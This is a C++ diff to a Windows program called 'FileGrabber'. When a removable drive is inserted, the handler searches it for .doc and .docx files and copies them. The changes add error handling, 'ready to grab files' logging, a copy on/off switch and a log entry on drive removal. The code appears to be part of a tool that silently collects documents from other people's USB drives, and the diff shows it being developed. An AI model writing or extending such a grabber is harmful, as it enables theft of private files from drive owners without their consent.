@@ -20,6 +20,7 @@ using namespace std;
 using namespace filesystem;
 
 bool IsServiceOn = true;
+bool IsCopyOn = true;
 
 void DeviceArrivalMain(TCHAR DriveLetter) {
 	/*
@@ -34,16 +35,27 @@ void DeviceArrivalMain(TCHAR DriveLetter) {
 		MessageBoxA(NULL, e.what(), "FileGrabber - Error", MB_ICONERROR);
 	}
 	*/
-	LOG->i(L"New disk inserted.");
-	Device dv(DriveLetter);
-	Device::DiskInformation info = dv.GetDiskInformation();
-	FileLister lister(dv);
-	shared_ptr<list<FileData>> pls = lister.ListFile();
-	FileSearcher fs;
-	shared_ptr<list<FileData>> psls = fs.FindFileRegex(pls, { L".*.doc" ,L".*.docx" });
-	FileCopyer cp(dv, psls);
-	cp.ListFile(pls);
-	cp.Copy();
+	try {
+		LOG->i(wstring(L"File grabbing module started. Ready to grab files. Drive Letter: ") + DriveLetter);
+		Device dv(DriveLetter);
+		Device::DiskInformation info = dv.GetDiskInformation();
+		FileLister lister(dv);
+		shared_ptr<list<FileData>> pls = lister.ListFile();
+		FileSearcher fs;
+		shared_ptr<list<FileData>> psls = fs.FindFileRegex(pls, { L".*.doc" ,L".*.docx" });
+		FileCopyer cp(dv, psls);
+		cp.ListFile(pls);
+		if (IsCopyOn) {
+			cp.Copy();
+		}
+		LOG->i(wstring(L"Grab done. Device Drive Letter: ") + DriveLetter);
+	}
+	catch (exception & e) {
+		LOG->e(wstring(L"Fatal Error: ") + Convert().toString(e.what()));
+	}
+	catch (...) {
+		LOG->e(L"Fatal Error: Unknown Error.");
+	}
 	/*
 	if (SystemConfig::getInstance()->FileCopyer) {
 		if (SystemConfig::getInstance()->NormalCopy) {
@@ -65,9 +77,10 @@ void DeviceArrivalMain(TCHAR DriveLetter) {
 }
 
 void DeviceRemovalMain(TCHAR DriveLetter) {
-
+	LOG->i(wstring(L"Device removed. Drive Letter: ") + DriveLetter);
 }
 
 // Usually this function should be empty.
 void InitProgram() {
+	Log::getInstance();
 }
